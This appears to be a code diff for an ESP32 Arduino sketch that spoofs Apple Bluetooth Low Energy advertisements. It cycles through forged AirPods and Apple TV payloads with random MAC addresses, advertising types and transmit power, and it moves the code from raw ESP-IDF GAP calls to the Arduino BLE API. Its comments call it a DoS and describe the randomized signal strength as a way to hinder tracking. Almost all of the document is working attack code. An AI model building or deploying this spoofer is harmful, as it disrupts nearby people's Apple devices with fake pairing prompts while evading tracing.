@@ -7,12 +7,6 @@
 #include <BLEServer.h>
 #include <esp_arduino_version.h>
 
-#include "esp_gap_ble_api.h"
-#include "esp_bt.h"
-#include "esp_bt_main.h"
-#include "esp_err.h"
-#include <string.h>
-
 // Bluetooth maximum transmit power
 #if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
 #define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
@@ -22,6 +16,7 @@
 #define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
 #endif
 
+BLEAdvertising *pAdvertising;  // global variable
 uint32_t delayMilliseconds = 100;
 
 /*
@@ -108,138 +103,121 @@ const uint8_t SHORT_DEVICES[][23] = {
   {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
 };
 
-/*
-  GAP callback（这里简单记录事件，可按需扩展）
-*/
-static void gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
-  switch (event) {
-    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
-      if (param && param->adv_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
-        Serial.printf("adv start failed, status %d\n", param->adv_start_cmpl.status);
-      } else {
-        Serial.println("adv start complete");
-      }
-      break;
-    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
-      if (param && param->adv_stop_cmpl.status != ESP_BT_STATUS_SUCCESS) {
-        Serial.printf("adv stop failed, status %d\n", param->adv_stop_cmpl.status);
-      } else {
-        Serial.println("adv stop complete");
-      }
-      break;
-    case ESP_GAP_BLE_ADV_DATA_SET_COMPLETE_EVT:
-      Serial.println("adv data set complete");
-      break;
-    default:
-      // 其他事件可按需处理
-      break;
-  }
-}
-
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting ESP32 BLE (using ESP-IDF GAP for adv control)");
+  Serial.println("Starting ESP32 BLE");
 
-  // 初始化 Arduino BLE（保留以便使用 BLEDevice 的部分功能）
   BLEDevice::init("AirPods 69");
 
-  // Increase the BLE Power to MAX
+  // Increase the BLE Power to 21dBm (MAX)
+  // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+  
+  // Create the BLE Server
+  BLEServer *pServer = BLEDevice::createServer();
+  pAdvertising = pServer->getAdvertising();
 
-  // 注册 GAP 回调（用于接收广告开始/停止等事件）
-  esp_ble_gap_register_callback(gap_cb);
-
-  // 你原来通过 pAdvertising->setDeviceAddress / setAdvertisementType 的行为
-  // 现在使用 esp_ble_gap_* 系列 API，在 loop() 中动态设置随机地址与原始广告数据。
+  // seems we need to init it with an address in setup() step.
+  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
 }
 
 void loop() {
-  // 生成随机 MAC（6 字节）
-  esp_bd_addr_t dummy_addr;
-  for (int i = 0; i < 6; i++) {
-    dummy_addr[i] = (uint8_t)random(256);
-    if (i == 0) {
-      dummy_addr[i] |= 0xF0; // 保持高四位为 1（如原逻辑）
+
+  // First generate fake random MAC
+  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+  for (int i = 0; i < 6; i++){
+    dummy_addr[i] = random(256);
+
+    // It seems for some reason first 4 bits
+    // Need to be high (aka 0b1111), so we 
+    // OR with 0xF0
+    if (i == 0){
+      dummy_addr[i] |= 0xF0;
     }
   }
 
-  // 把随机地址设置为随机地址（注意：返回值可检查以确定是否成功）
-  esp_err_t e = esp_ble_gap_set_rand_addr(dummy_addr);
-  if (e != ESP_OK) {
-    Serial.printf("esp_ble_gap_set_rand_addr failed: %d\n", e);
-  }
+  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
-  // 构造广告原始数据（raw payload）
-  uint8_t adv_payload[31];
-  size_t adv_len = 0;
-
-  int device_choice = random(2); // 0 = long (31), 1 = short (23)
-  if (device_choice == 0) {
-    int count = sizeof(DEVICES) / sizeof(DEVICES[0]);
-    int index = random(count);
-    memcpy(adv_payload, DEVICES[index], 31);
-    adv_len = 31;
+  // Randomly pick data from one of the devices
+  // First decide short or long
+  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
+  int device_choice = random(2);
+  if (device_choice == 0){
+    int index = random(22);
+    #ifdef ESP_ARDUINO_VERSION_MAJOR
+      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
+          oAdvertisementData.addData(String((char*)DEVICES[index], 31));
+      #else
+          oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
+      #endif
+    #endif
   } else {
-    int count = sizeof(SHORT_DEVICES) / sizeof(SHORT_DEVICES[0]);
-    int index = random(count);
-    memcpy(adv_payload, SHORT_DEVICES[index], 23);
-    adv_len = 23;
+    int index = random(13);
+    #ifdef ESP_ARDUINO_VERSION_MAJOR
+      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
+          oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
+      #else
+          oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
+      #endif
+    #endif
   }
 
-  // 选择广告 PDU 类型（映射为 ESP_BLE_ADV_TYPE_*）
+  /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
+      the three advertising PDU types when you want to connect to Apple devices.
+          // 0 = ADV_TYPE_IND, 
+          // 1 = ADV_TYPE_SCAN_IND
+          // 2 = ADV_TYPE_NONCONN_IND
+      
+      Randomly using any of these PDU types may increase detectability of spoofed packets. 
+
+      What we know for sure:
+      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
+                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
+  */
+
   int adv_type_choice = random(3);
-  esp_ble_adv_type_t esp_adv_type = ESP_BLE_ADV_TYPE_IND;
-  if (adv_type_choice == 0) {
-    esp_adv_type = ESP_BLE_ADV_TYPE_IND;         // connectable undirected
-  } else if (adv_type_choice == 1) {
-    esp_adv_type = ESP_BLE_ADV_TYPE_SCAN_IND;    // scannable undirected
+  if (adv_type_choice == 0){
+    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
+  } else if (adv_type_choice == 1){
+    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
   } else {
-    esp_adv_type = ESP_BLE_ADV_TYPE_NONCONN_IND; // non-connectable undirected
+    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
   }
 
-  // 配置原始广告数据（此调用异步触发 ESP_GAP_BLE_ADV_DATA_SET_COMPLETE_EVT）
-  esp_err_t rc = esp_ble_gap_config_adv_data_raw(adv_payload, adv_len);
-  if (rc != ESP_OK) {
-    Serial.printf("esp_ble_gap_config_adv_data_raw failed: %d\n", rc);
-  }
+  // Set the device address, advertisement data
+  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
+  pAdvertising->setAdvertisementData(oAdvertisementData);
 
-  // 配置广告参数
-  esp_ble_adv_params_t adv_params;
-  memset(&adv_params, 0, sizeof(adv_params));
-  adv_params.adv_int_min = 0x20;
-  adv_params.adv_int_max = 0x20;
-  adv_params.adv_type = esp_adv_type;
-  adv_params.own_addr_type = BLE_ADDR_TYPE_RANDOM; // 我们设置了随机地址
-  adv_params.channel_map = ADV_CHNL_ALL;
-  adv_params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
+  // Set advertising interval
+  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
+      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
+      
+      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
+  */
 
-  // 启动广告
-  rc = esp_ble_gap_start_advertising(&adv_params);
-  if (rc != ESP_OK) {
-    Serial.printf("esp_ble_gap_start_advertising failed: %d\n", rc);
-  } else {
-    Serial.println("Sending Advertisement...");
-  }
+  //pAdvertising->setMinInterval(0x20);
+  //pAdvertising->setMaxInterval(0x20);
+  //pAdvertising->setMinPreferred(0x20);
+  //pAdvertising->setMaxPreferred(0x20);
 
-  delay(delayMilliseconds);
+  // Start advertising
+  Serial.println("Sending Advertisement...");
+  pAdvertising->start();
+  delay(delayMilliseconds); // delay for delayMilliseconds ms
+  pAdvertising->stop();
 
-  // 停止广告
-  rc = esp_ble_gap_stop_advertising();
-  if (rc != ESP_OK) {
-    Serial.printf("esp_ble_gap_stop_advertising failed: %d\n", rc);
-  }
-
-  // Randomize TX power (保持原逻辑)
-  int rand_val = random(100);
-  if (rand_val < 70) {
+  // Random signal strength increases the difficulty of tracking the signal
+  int rand_val = random(100);  // Generate a random number between 0 and 99
+  if (rand_val < 70) {  // 70% probability
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-  } else if (rand_val < 85) {
+  } else if (rand_val < 85) {  // 15% probability
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
-  } else if (rand_val < 95) {
+  } else if (rand_val < 95) {  // 10% probability
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
-  } else if (rand_val < 99) {
+  } else if (rand_val < 99) {  // 4% probability
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
-  } else {
+  } else {  // 1% probability
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
   }
 }
